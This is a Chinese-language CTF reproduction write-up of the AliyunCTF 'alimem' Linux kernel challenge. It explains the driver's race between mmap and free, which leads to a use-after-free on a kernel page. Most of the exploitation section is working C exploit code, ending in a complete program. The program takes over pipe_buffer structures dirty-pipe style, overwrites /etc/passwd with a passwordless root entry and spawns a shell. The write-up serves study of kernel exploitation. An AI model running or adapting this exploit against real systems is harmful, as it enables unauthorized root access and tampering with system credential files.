---
title: AliyunCTF--Alimem
date: 2026-02-07 09:50:00
categories:
  - recurrence
tags:
---

# AliyunCTF--Alimem

# 一. 背景介绍

​	本题主要是通过实现了一个misc设备来实现一个简单的内存管理模块，支持增删查改以及mmap的回调函数，通过对于本题的学习了解如何注册一个Misc设备并且通过vma_area_struct实现虚拟内存的实现，最终利用多线程竞争的漏洞，实现对于内核页的uaf，利用splice函数将只读的/etc/passwd覆盖，实现提权的思路。

### 1.1 splice函数

```C
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <fcntl.h>

ssize_t splice(int fd_in, loff_t *off_in, int fd_out,
               loff_t *off_out, size_t len, unsigned int flags);
```

​	当我们想要将一个文件的数据拷贝到另一个文件时，比较朴素的一种想法是打开两个文件后将源文件数据读入后再写入目标文件，但这样的做法需要在用户空间与内核空间之间来回进行数据拷贝，具有可观的开销，因此为了减少这样的开销， splice这一个非常独特的系统调用应运而生，其作用是在文件与管道之间进行数据拷贝，以此将内核空间与用户空间之间的数据拷贝转变为内核空间内的数据拷贝，从而避免了数据在用户空间与内核空间之间的拷贝造成的开销。

​	因此如果我们存在一个UAF可以控制pipe_buffer结构体，可以清除flags字段的只读，就可以通过利用管道的读写，实现对于内核中只读的文件进行覆盖，这里的思路借鉴了CVE-2022-0847 dirty pipe的思想，利用这个办法可以避免传统覆盖pipe_buf_operations的方法，可以减少对于内核基地址的泄露，直接覆盖/etc/passwd实现提权思想。

```C
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

### 1.2 struct page结构体

- virt_to_page() 返回与虚拟地址关联的页面
- pfn_to_page() 返回与页面帧号关联的页面
- page_to_pfn() 返回与 struct page 关联的页面帧号
- page_address() 返回 struct page 的虚拟地址；此函数只能用于 lowmem 中的页面
- kmap() 为任意物理页面（可以来自 highmem）在内核中创建映射，并返回虚拟地址，该虚拟地址可用于直接引用该页面

### 1.3 vm_area_struct结构体

​	它表示的是一块连续的虚拟地址空间区域，给进程使用的，地址空间范围是0~3G，对应的物理页面都可以是不连续的。

![1741167424394](images/alimem/1741167424394.jpg)

- vm_start 以及 vm_end ——内存区域的起始和结束地址（这些字段也出现在 /proc/<pid>/maps 中）；

- vm_file ——关联 file 结构的指针（如果有的话）；

- vm_pgoff ——区域在文件中的偏移量；

- vm_flags ——一组标志；

- vm_ops ——该区域的工作函数集合；

- vm_next 以及 vm_prev ——同一进程的区域通过链表结构连接起来。

  对于驱动实现mmap回调函数来说，主要的作用就是讲设备的物理地址和要分配的虚拟地址进行映射，也就就是利用remap_pfn_range() 将连续的物理地址空间映射到由 vm_area_struct 表示的虚拟空间

  ```C
  int remap_pfn_range(struct vm_area_struct *vma, unsigned long addr,
                      unsigned long pfn, unsigned long size, pgprot_t prot);
  ```

# 二. 漏洞产生原因

### 2.1 alimem_mmap函数

```C
static int alimem_mmap(struct file *filp, struct vm_area_struct *vma)
{
    int idx = vma->vm_pgoff;
    struct alimem_page *page;
    int ret = -EINVAL;

    if (idx < 0 || idx >= MAX_PAGES) return -EINVAL;

    if (vma->vm_end - vma->vm_start != PAGE_SIZE) {
        return -EINVAL;
    }

    rcu_read_lock();
    if(!pages[idx]) {
        rcu_read_unlock();
        return -EINVAL;
    }
    page = rcu_dereference(pages[idx]);
    if (page) {
        phys_addr_t phys = page->phys;
        vma->vm_ops = &alimem_vm_ops;
        vma->vm_private_data = page;
        vm_flags_set(vma, vma->vm_flags | VM_DONTEXPAND | VM_DONTDUMP);
        rcu_read_unlock();
        if (remap_pfn_range(vma, vma->vm_start, 
                          phys >> PAGE_SHIFT,
                          vma->vm_end - vma->vm_start,
                          vma->vm_page_prot)) {
            return -EAGAIN;
        }
        
        atomic_inc(&page->refcount);
        return 0;
    }
    rcu_read_unlock();
    return ret;
}
```

​	该 alimem_mmap 函数是 Linux 设备驱动中实现内存映射的核心机制，其通过参数校验（检查用户指定的内存页索引是否合法及映射长度是否符合单页要求）、RCU 保护下的内存页查找（确保访问全局数组时的线程安全）、虚拟内存区域配置（设置自定义的 vm_ops 操作集并将 alimem_page 关联到 vm_private_data 以提供操作上下文）、物理内存映射（利用 remap_pfn_range 将内核物理页转换为用户虚拟地址）以及引用计数管理（通过原子操作确保内存页生命周期安全），构建了用户空间直接访问内核物理内存的通道。这种设计实现了**零拷贝**机制，用户程序可通过指针直接操作设备内存，避免了传统 read/write 系统调用在用户态与内核态间的数据复制开销。

​	但是在设计中存在一个漏洞首先线通过rcu_dereference获得到了page的一个引用，之后在对其进行处理操作之后对于refcount进行增加。这就给到了多线程竞争的时间。

### 2.2 ioctl函数

```C
static long alimem_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    int idx, ret = 0;
    struct alimem_page *new_page;

    switch (cmd) {
    case ALIMEM_ALLOC: {
        new_page = kzalloc(sizeof(*new_page), GFP_KERNEL);
        if (!new_page) return -ENOMEM;
    
        new_page->virt = (void *)__get_free_pages(GFP_KERNEL, PAGE_ORDER);
        if (!new_page->virt) {
            kfree(new_page);
            return -ENOMEM;
        }
    
        new_page->phys = virt_to_phys(new_page->virt);
        atomic_set(&new_page->refcount, 1);
    
        down_write(&pages_lock);
        for (idx = 0; idx < MAX_PAGES; idx++) {
            if (!pages[idx]) {
                rcu_assign_pointer(pages[idx], new_page);
                up_write(&pages_lock);
                return idx;
            }
        }
        up_write(&pages_lock);
        free_pages((unsigned long)new_page->virt, PAGE_ORDER);
        kfree(new_page);
        return -ENOSPC;
    }
    
    case ALIMEM_FREE: {
        struct alimem_page *old;
    
        if (get_user(idx, (int __user *)arg)) return -EFAULT;
        if (idx < 0 || idx >= MAX_PAGES) return -EINVAL;
    
        down_write(&pages_lock);
        old = pages[idx];
        if (old) {
            rcu_assign_pointer(pages[idx], NULL);
            if (atomic_dec_and_test(&old->refcount)) {
                memset(old->virt, 0, PAGE_SIZE);
                call_rcu(&old->rcu, free_page_rcu);
            }
        }
        up_write(&pages_lock);
        return 0;
    }
    
    case ALIMEM_WRITE: {
        struct alimem_write wr;
        struct alimem_page *page;
    
        if (copy_from_user(&wr, (void __user *)arg, sizeof(wr)))
            return -EFAULT;
    
        if (wr.idx < 0 || wr.idx >= MAX_PAGES || 
            wr.offset + wr.size > PAGE_SIZE)
            return -EINVAL;
    
        rcu_read_lock();
        page = rcu_dereference(pages[wr.idx]);
        if (!page) {
            rcu_read_unlock();
            return -EFAULT;
        }
    
        if (copy_from_user(page->virt + wr.offset, wr.data, wr.size)) {
            rcu_read_unlock();
            return -EFAULT;
        }
        rcu_read_unlock();
        return 0;
    }
    
    case ALIMEM_READ: {
        struct alimem_read rd;
        struct alimem_page *page;
    
        if (copy_from_user(&rd, (void __user *)arg, sizeof(rd)))
            return -EFAULT;
    
        if (rd.idx < 0 || rd.idx >= MAX_PAGES || 
            rd.offset + rd.size > PAGE_SIZE)
            return -EINVAL;
    
        rcu_read_lock();
        page = rcu_dereference(pages[rd.idx]);
        if (!page) {
            rcu_read_unlock();
            return -EFAULT;
        }
    
        if (copy_to_user(rd.data, page->virt + rd.offset, rd.size)) {
            rcu_read_unlock();
            return -EFAULT;
        }
        rcu_read_unlock();
        return 0;
    }
    
    default:
        return -ENOTTY;
    }

}
```

​	该 alimem_ioctl 函数通过处理 ALIMEM_ALLOC、ALIMEM_FREE、ALIMEM_WRITE 和 ALIMEM_READ 四个控制命令，实现了对内核物理内存页的动态分配、释放及用户态数据的读写操作：在分配时，通过 __get_free_pages 申请物理内存页并记录其虚拟与物理地址，利用自旋锁保护全局页表 pages 的更新，确保线程安全地插入空闲索引位；释放时通过原子引用计数和 RCU 机制延迟回收内存，避免并发访问冲突；读写操作则在验证索引与偏移合法性后，直接通过 copy_from_user 和 copy_to_user 在内核页与用户缓冲区之间传输数据，绕过传统文件读写的数据复制开销。整个过程通过 pages_lock 写锁与 RCU 读锁的协同，保障多线程环境下页表访问的原子性与一致性，同时借助引用计数和内存清零（memset）确保资源安全释放，最终实现用户态程序对设备内存的高效零拷贝访问。

​	但是漏洞主要发生的问题在于在free的时候由于没有加入rcu的读锁，导致我们可以在多线程竞争的情况下不断地free，如果在mmap获取引用和自增refcount之间的这段时间里面free掉了这个页面，那么我们就可以成功的mmap到之前free的一个页面，之后再利用pipe_buffer的分配就可以实现漏洞的利用了。

# 三.漏洞利用

### 3.1 uaf构造

```c
void check_zero(void *addr) {
    char *p = (char*)addr;
    for (int i = 0; i < PAGE_SIZE; i++) {
        if (p[i] != 0) return;
    }
    atomic_store(&uaf_detected, 1);
}

void* mapper_thread(void *arg) {
    int idx = *(int*)arg;
    addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, idx * PAGE_SIZE);
    usleep(500);
    if (addr != MAP_FAILED) {
        usleep(50000);
        check_zero(addr);
        if(!uaf_detected)
            munmap(addr, PAGE_SIZE);
    }
    return NULL;
}
```

​	首先讲一下check_zero函数和mapper_thread函数，这两个函数主要是对于上述所说的多线程竞争的主要实现，首先通过传入的id，来利用mmap函数分配虚拟设备中的内存，之后sleep一段时间，这段时间位于后面的usleep(50)多一些，使得后面可以不断的free，尝试再mmap获取到引用之后进行free。

```c
void write_pattern(int idx) {
    char buf[PAGE_SIZE];
    memset(buf, PATTERN, sizeof(buf));
    

    struct alimem_write wr = {
        .idx = idx,
        .offset = 0,
        .data = buf,
        .size = sizeof(buf)
    };
    if (ioctl(fd, ALIMEM_WRITE, &wr) < 0) {
        perror("write error");
    }

}
```

​	对于wirte_pattern就是利用ioctl的write进行写，这里为了方便就是都覆盖为PATTERN也就是0xAA，这样后面再进行读取的时候直接check_zero，如果页面全为0了就说明这个页面已经被释放了。

```C
int idx, attempt = 0;
    pthread_t tid;
    

for(int i = 0; i < PIPE_NUM; i++){
    if(pipe(pipe_fd[i]) < 0){
        perror("pipe");
        return -1;
    }
}

if ((fd = open(DEV_PATH, O_RDWR)) < 0) {
    perror("device open failed");
    exit(EXIT_FAILURE);
}

printf("[+] Start to trigger racing bug...\n");
while (!atomic_load(&uaf_detected) && attempt++ < MAX_ATTEMPTS) {
    idx = ioctl(fd, ALIMEM_ALLOC);
    if (idx < 0) continue;
    write_pattern(idx);
    
    pthread_create(&tid, NULL, mapper_thread, &idx);
    usleep(50); // 精确控制竞争窗⼝
    ioctl(fd, ALIMEM_FREE, &idx);
    
    pthread_join(tid, NULL);
    
    if (attempt) {
        printf("[+] try %d times...\r", attempt);
        fflush(stdout);
    }
}

if (atomic_load(&uaf_detected)) {
    printf("\n[+] UAF detected, try times: %d\n", attempt);
} else {
    printf("\n[-] UAF detected error\n");
}
```

​	之后就是对于整个攻击流程的讲解，这里首先就是利用了pipe创建一定数目的pipe_buffer，提前创建防止后面alloc之后产生噪声，之后就是打开驱动文件，之后利用atomic_load原子操作来读取uaf_detected变量，主要是识别是否已经出现uaf的页面了，不断进行尝试，free以及mmap，这样如果出现之前所说的在mmap获取引用和refcount自增之前free掉了这个页面就可以获得到一个UAF的页面，可以进行下一步的攻击。

```C
for (int i = 0; i < PIPE_NUM; i++) {
        if(fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 4 * 0x1000) < 0) {
            perror("fcntl");
            return -1;
        }
    }

int target_fd = open("/etc/passwd", O_RDONLY);
if(target_fd < 0){
    perror("open");
    return -1;
}

for(int i = 0; i < PIPE_NUM; i++){
    loff_t offset = i;
    ssize_t nbytes = splice(target_fd, &offset, pipe_fd[i][1], NULL, 1, 0);
    if (nbytes < 0) {
        perror("splice failed");
        return EXIT_FAILURE;
    }
}
```

​	之后就是利用fcntl对于pipe_buffer实现修改大小，将其修改成4k也就是一个页面的大小，这样就有概率申请到我们之前释放掉的page页面，然后就是通过只读的方式读取/etc/passwd，利用循环给/etc/passwd和之前申请的管道创建splice，方便后面我们直接通过管道就可以修改/etc/passwd文件的内容。

```C
char *ptr = 0;
    int found = 0;
    if ((ptr = memmem(addr, 0x1000, "\xff\xff", 2))) {
        hexdump(ptr - 6, 0x40);
        found = 1;
    }

if (found) {
    struct pipe_buffer *pp = (struct pipe_buffer *)(ptr - 6);
    pp->len = 0;
    pp->offset = 0;
    pp->flags |= 0x10;
    hexdump(ptr - 6, 0x40);
} else {
    printf("\n[-] UAF pipe_buffer error\n");
}
```

![1741173753507](images/alimem/1741173753507.jpg)	

​	利用memmem函数就是找0x1000长度我们之前获得到的uaf页面中找到第一个出现两个字节"\xff\xff"的位置，这里其实就是找到pipe_buffer结构的第一个指针**page**指针，找到之后减去6就是我们再uaf中写入的pipe_buffer结构体的指针，之后我们将其重新设置长度偏移和flags，也就是让他变的可写。

```C
char *r00t = "root::0:0:root:/root:/bin/sh\n";
for (int i = 0; i < PIPE_NUM; i++) {
    if (write(pipe_fd[i][1], r00t, strlen(r00t)) > 0) {
        continue;
    }
}

system("/bin/sh");
```

​	最后就是利用写pipe管道向/etc/passwd的第一行进行覆盖，使得root用户可以不用密码就可以登录。

​	最终的exp如下：

```C
#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/kcmp.h>
#include <linux/pkt_cls.h>
#include <linux/pkt_sched.h>
#include <linux/rtnetlink.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <stdatomic.h>

#define PAGE_SIZE 4096
#define DEV_PATH "/dev/alimem"
#define PATTERN 0xAA
#define MAX_ATTEMPTS 100000
#define ALIMEM_ALLOC 0x1337
#define ALIMEM_FREE 0x1338
#define ALIMEM_WRITE 0x1339
#define ALIMEM_READ 0x133a

struct alimem_write {
    int idx;
    unsigned int offset;
    const char *data;
    size_t size;
};

struct alimem_read {
    int idx;
    unsigned int offset;
    char *data;
    size_t size;
};

struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

int fd;
void *addr;
#define PIPE_NUM 400
int pipe_fd[400][2];
atomic_int uaf_detected = 0;

void hexdump(void *addr, size_t len) {
    unsigned char *p = (unsigned char*)addr;
    for (int i = 0; i < len; i++) {
        printf("%02X ", p[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

void write_pattern(int idx) {
    char buf[PAGE_SIZE];
    memset(buf, PATTERN, sizeof(buf));
    
    struct alimem_write wr = {
        .idx = idx,
        .offset = 0,
        .data = buf,
        .size = sizeof(buf)
    };
    if (ioctl(fd, ALIMEM_WRITE, &wr) < 0) {
        perror("write error");
    }
}

void check_zero(void *addr) {
    char *p = (char*)addr;
    for (int i = 0; i < PAGE_SIZE; i++) {
        if (p[i] != 0) return;
    }
    atomic_store(&uaf_detected, 1);
}

void* mapper_thread(void *arg) {
    int idx = *(int*)arg;
    addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, idx * PAGE_SIZE);
    usleep(500);
    if (addr != MAP_FAILED) {
        usleep(50000);
        check_zero(addr);
        if(!uaf_detected)
            munmap(addr, PAGE_SIZE);
    }
    return NULL;
}

int main() {
    int idx, attempt = 0;
    pthread_t tid;
    
    for(int i = 0; i < PIPE_NUM; i++){
        if(pipe(pipe_fd[i]) < 0){
            perror("pipe");
            return -1;
        }
    }
    
    if ((fd = open(DEV_PATH, O_RDWR)) < 0) {
        perror("device open failed");
        exit(EXIT_FAILURE);
    }

    printf("[+] Start to trigger racing bug...\n");
    while (!atomic_load(&uaf_detected) && attempt++ < MAX_ATTEMPTS) {
        idx = ioctl(fd, ALIMEM_ALLOC);
        if (idx < 0) continue;
        write_pattern(idx);
        
        pthread_create(&tid, NULL, mapper_thread, &idx);
        usleep(50); // 精确控制竞争窗⼝
        ioctl(fd, ALIMEM_FREE, &idx);
        
        pthread_join(tid, NULL);
        
        if (attempt) {
            printf("[+] try %d times...\r", attempt);
            fflush(stdout);
        }
    }

    if (atomic_load(&uaf_detected)) {
        printf("\n[+] UAF detected, try times: %d\n", attempt);
    } else {
        printf("\n[-] UAF detected error\n");
    }

    for (int i = 0; i < PIPE_NUM; i++) {
        if(fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 4 * 0x1000) < 0) {
            perror("fcntl");
            return -1;
        }
    }

    int target_fd = open("/etc/passwd", O_RDONLY);
    if(target_fd < 0){
        perror("open");
        return -1;
    }

    for(int i = 0; i < PIPE_NUM; i++){
        loff_t offset = i;
        ssize_t nbytes = splice(target_fd, &offset, pipe_fd[i][1], NULL, 1, 0);
        if (nbytes < 0) {
            perror("splice failed");
            return EXIT_FAILURE;
        }
    }

    char *ptr = 0;
    int found = 0;
    if ((ptr = memmem(addr, 0x1000, "\xff\xff", 2))) {
        hexdump(ptr - 6, 0x40);
        found = 1;
    }

    if (found) {
        struct pipe_buffer *pp = (struct pipe_buffer *)(ptr - 6);
        pp->len = 0;
        pp->offset = 0;
        pp->flags |= 0x10;
        hexdump(ptr - 6, 0x40);
    } else {
        printf("\n[-] UAF pipe_buffer error\n");
    }

    char *r00t = "root::0:0:root:/root:/bin/sh\n";
    for (int i = 0; i < PIPE_NUM; i++) {
        if (write(pipe_fd[i][1], r00t, strlen(r00t)) > 0) {
            continue;
        }
    }

    system("/bin/sh");
    return 0;
}
```



# 四. 疑难问题

​	由于busybox中加入了s这个权限，所以导致直接利用cpio进行打包的时候无法重新模拟，之后因此去除了suid的权限，但是会导致后面执行完覆盖/etc/passwd后无法使用su命令切换成root用户。

![1741173882219](images/alimem/1741173882219.jpg)

​	但是可以通过cat /etc/passwd观察到，已经覆盖为指定内容的数据了。

![1741173955066](images/alimem/1741173955066.jpg)

​	多出来的回车其实是之前的root多了一个x由于这里没有覆盖之前的\n导致出现空行。

# 五. 总结

​	通过本题的复现，我们可以清楚的掌握如何编写一个模拟内存分配的misc设备，并且如何防止多线程造成的问题（加入rcu写锁）,最后也就是如何利用splice函数实现不用泄露程序基地址就可以直接实现覆盖/etc/passwd，进而实现权限提升，本题难度不大，但是也掌握到了一定的漏洞利用方式。
